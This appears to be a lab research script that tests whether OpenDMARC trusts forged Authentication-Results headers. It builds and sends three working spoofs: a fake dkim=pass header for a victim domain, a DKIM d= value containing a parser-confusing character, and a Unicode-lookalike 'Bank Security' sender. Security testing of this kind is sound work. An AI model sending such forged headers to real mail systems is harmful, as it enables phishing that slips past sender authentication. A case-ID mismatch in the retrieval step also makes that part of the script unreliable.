"""Trust-input probes against OpenDMARC 1.4.2 (Debian bookworm default).

ar1: forged Authentication-Results claiming our own AuthservID with a fake
     dkim=pass for the victim domain, unsigned spoof. Does OpenDMARC consume
     it as its DKIM input and align to the victim?
ar2: Chen-A4 style meta-character d= — signature verified against a key
     published under the literal qname containing '(' (attacker-controlled
     zone shape in lab DNS), AR header.d carries the raw string; if OpenDMARC
     parses the AR value with comment semantics it aligns on the victim.
ar3: U-label spoof + forged AR with dkim=pass — display-layer badge probe
     (browser verification happens separately).
"""
from __future__ import annotations

import base64
import hashlib
import json
import subprocess
import sys
import time
from pathlib import Path

sys.path.insert(0, "/mnt/e/MailSecLab/received-lab")
from research import reference, structure
from research.lib.evidence import sha256_bytes, write_json

RUN = Path("/mnt/e/MailSecLab/received-lab/results/research/w2-20261002a")
STAGE = RUN / "ar"
KEY = Path("/mnt/e/MailSecLab/received-lab/results/research/w1-20261001a/keys/priv.pem")
EVIDENCE = "/evidence/w2-20261002a/ar"
H_NAMES = ["from", "to", "date", "subject", "message-id"]
VICTIM = "xn--mnchen-3ya.lab.test"
WEIRD_D = "xn--mnchen-3ya.lab.test(.attacker.test"

FORGED_AR_PASS = (
    b"Authentication-Results: mail.lab.test; dkim=pass (2048-bit key) "
    b"header.d=" + VICTIM.encode() + b" header.i=@" + VICTIM.encode() + b" header.b=forged\r\n"
)
FORGED_AR_ULABEL = (
    "Authentication-Results: mail.lab.test; dkim=pass (2048-bit key) "
    "header.d=m\u00fcnchen.lab.test\r\n".encode("utf-8")
)


def sh(args, timeout=90):
    proc = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout, check=False)
    return proc.returncode, proc.stdout.decode("utf-8", "replace"), proc.stderr.decode("utf-8", "replace")


def sign_custom(raw: bytes, middle_tags: bytes) -> bytes:
    info = structure.require_modern(raw)
    body = reference.canonical_body(raw[info["boundary"] + 4:], "relaxed")
    bh = base64.b64encode(hashlib.sha256(body).digest())
    signature = (b"DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; " + middle_tags +
                 b";\r\n h=" + ":".join(H_NAMES).encode() + b";\r\n bh=" + bh + b"; b=\r\n")
    hashed, _ = reference.hashing_input(raw, signature, H_NAMES, "relaxed")
    result = subprocess.run(["openssl", "dgst", "-sha256", "-sign", str(KEY)], input=hashed, capture_output=True, check=True)
    signature = signature[:-2] + base64.b64encode(result.stdout) + b"\r\n"
    return signature + raw


def build(case_id: str, from_line: bytes, extra_headers: bytes = b"", sign_middle: bytes | None = None) -> bytes:
    headers = [
        from_line,
        b"To: bob@lab.test",
        b"Date: Fri, 2 Oct 2026 17:00:00 +0000",
        b"Subject: ar trust probe",
        f"Message-ID: <{case_id}@lab.test>".encode(),
        f"X-Case-ID: {case_id}".encode(),
    ]
    raw = b"\r\n".join(headers) + b"\r\n\r\nControlled research body.\r\nCase: " + case_id.encode() + b"\r\n"
    if extra_headers:
        raw = extra_headers + raw
    if sign_middle is not None:
        raw = sign_custom(raw, sign_middle)
    return raw


FETCH_SCRIPT = r'''
import imaplib, json, sys
case = sys.argv[1]
m = imaplib.IMAP4("msl-dovecot", 143)
m.login("bob", "lab-bob")
m.select("INBOX", readonly=True)
typ, data = m.search(None, "ALL")
out = {"found": False}
for item in reversed(data[0].split()):
    typ, msg = m.fetch(item, "(BODY.PEEK[HEADER.FIELDS (X-CASE-ID)])")
    blob = (msg[0][1] or b"") if msg and msg[0] else b""
    if case.encode() not in blob:
        continue
    typ, full = m.fetch(item, "(BODY.PEEK[])")
    raw = full[0][1]
    open(f"/evidence/w2-20261002a/ar/{case}.stored.eml", "wb").write(raw)
    ars = []
    for l in raw.split(b"\r\n"):
        if b"Authentication-Results" in l:
            ars.append(l.decode("utf-8", "replace").strip()[:160])
    out = {"found": True, "uid": item.decode(), "ar": ars}
    break
m.logout()
print(json.dumps(out))
'''


def fetch_stored(case_id: str, tries: int = 8, delay: float = 3.0):
    last = {"found": False}
    for _ in range(tries):
        proc = subprocess.run(["docker", "exec", "-i", "msl-client", "python3", "-", case_id],
                              input=FETCH_SCRIPT.encode(), stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE, timeout=60, check=False)
        try:
            last = json.loads(proc.stdout.decode())
        except json.JSONDecodeError:
            last = {"found": False}
        if last.get("found"):
            return last
        time.sleep(delay)
    return last


def send(name: str, raw: bytes) -> dict:
    (STAGE / f"{name}.eml").write_bytes(raw)
    code, out, err = sh([
        "docker", "exec", "msl-client", "python3", "/opt/research/lib/smtp_send.py",
        "--server", "msl-auth-postfix", "--port", "25",
        "--mail-from", "alice@lab.test", "--rcpt-to", "bob@lab.test",
        "--input", f"{EVIDENCE}/{name}.eml",
        "--transcript", f"{EVIDENCE}/{name}.smtp.txt",
    ], timeout=90)
    try:
        return json.loads(out)
    except json.JSONDecodeError:
        return {"accepted": False, "raw": (out or err)[-200:]}


def main() -> None:
    STAGE.mkdir(parents=True, exist_ok=True)
    cases = []

    raw1 = build("ar1-forged-ar", f"From: Spoofed <author@{VICTIM}>".encode(), extra_headers=FORGED_AR_PASS)
    cases.append(("ar1-forged-ar", raw1))

    raw2 = build("ar2-comment-d", f"From: Spoofed <author@{VICTIM}>".encode(),
                 sign_middle=b"d=" + WEIRD_D.encode() + b";\r\n s=cal")
    cases.append(("ar2-comment-d", raw2))

    raw3 = build("ar3-badge-ulabel", "From: Bank Security <security@m\u00fcnchen.lab.test>".encode("utf-8"),
                 extra_headers=FORGED_AR_ULABEL)
    cases.append(("ar3-badge-ulabel", raw3))

    rows = []
    for name, raw in cases:
        sent = send(name, raw)
        stored = fetch_stored("ar-" + name) if sent.get("accepted") else {"found": False}
        row = {"case": name, "smtp": sent.get("reply"), "accepted": sent.get("accepted"),
               "sha256": sha256_bytes(raw), "stored": stored}
        write_json(STAGE / f"{name}.json", {"row": row})
        rows.append({"case": name, "reply": sent.get("reply"), "ar": stored.get("ar", [])})
        print(json.dumps(rows[-1], ensure_ascii=False), flush=True)
        time.sleep(3)
    write_json(STAGE / "cases.json", {"rows": rows})


if __name__ == "__main__":
    main()
